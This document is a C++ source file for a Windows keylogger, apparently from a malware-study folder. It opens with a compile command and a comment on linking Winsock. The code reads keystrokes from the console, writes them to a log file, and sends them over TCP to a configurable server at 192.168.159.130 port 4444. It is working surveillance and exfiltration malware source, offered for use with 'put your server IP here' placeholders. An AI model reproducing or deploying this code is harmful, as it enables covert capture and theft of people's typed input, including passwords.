/*
C:\mal_pe\keylogger\Keylogger_00>g++ keylogger_windows.cpp -o keylogger_windows -lws2_32
fanzhefu:
The Winsock2 library (“ws2_32”) contains the implementation of Windows networking functions. 
Unlike some open-source libraries where the source code is available and compiled directly 
into your project, the implementation of Winsock2 is part of Windows itself and is not open source. 
Instead, Windows provides the compiled library (ws2_32.lib) as an interface to these networking functions. 
This means that you have to explicitly link to this library so that the linker knows where to 
find the implementation of these functions. Without this step, GCC cannot resolve references to 
these functions, leading to errors.
*/

#include <iostream>
#include <fstream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

using namespace std;

// IP address and port of socket server
const string SERVER_IP = "192.168.159.130";  // Put your server IP here
const int SERVER_PORT = 4444;         // Put your server port here

int main() {
    string keys;
    HANDLE keyboardHandle = GetStdHandle(STD_INPUT_HANDLE);

    // Set console mode to receive keyboard events
    DWORD consoleMode;
    GetConsoleMode(keyboardHandle, &consoleMode);
    SetConsoleMode(keyboardHandle, ENABLE_EXTENDED_FLAGS | ENABLE_WINDOW_INPUT | ENABLE_MOUSE_INPUT);

    // Initializing Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "Error initializing Winsock." << endl;
        return 1;
    }

    // Create socket
    SOCKET socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == INVALID_SOCKET) {
        cout << "Error creating socket." << endl;
        WSACleanup();
        return 1;
    }

    // Set up server address
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
        cout << "Invalid IP address." << endl;
        closesocket(socket_fd);
        WSACleanup();
        return 1;
    }

    // Connect to server
    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "Error connecting to server." << endl;
        closesocket(socket_fd);
        WSACleanup();
        return 1;
    }

    while (true) {
        INPUT_RECORD inputRecord;
        DWORD eventsRead;
        ReadConsoleInput(keyboardHandle, &inputRecord, 1, &eventsRead);

        if (inputRecord.EventType == KEY_EVENT && inputRecord.Event.KeyEvent.bKeyDown) {
            WORD keyCode = inputRecord.Event.KeyEvent.wVirtualKeyCode;
            if (keyCode == VK_RETURN) {
                cout << "<br>";
                keys += "<br>";
            } else if (keyCode == VK_SPACE) {
                cout << " ";
                keys += " ";
            } else if (keyCode == VK_OEM_PERIOD) {
                cout << ".";
                keys += ".";
            } else if (keyCode >= 'A' && keyCode <= 'Z') {
                cout << static_cast<char>(keyCode);
                keys += static_cast<char>(keyCode);
            }

            ofstream myfile;
            myfile.open("keylogger_windows.log", ios::app);  // Replace "log file" with your desired path and file name
            myfile << keys;
            myfile.close();

            // Send data to server
            if (send(socket_fd, keys.c_str(), keys.length(), 0) == SOCKET_ERROR) {
                cout << "Error sending data to server." << endl;
                closesocket(socket_fd);
                WSACleanup();
                return 1;
            }
        }
    }

    // Cleanup
    closesocket(socket_fd);
    WSACleanup();
    return 0;
}
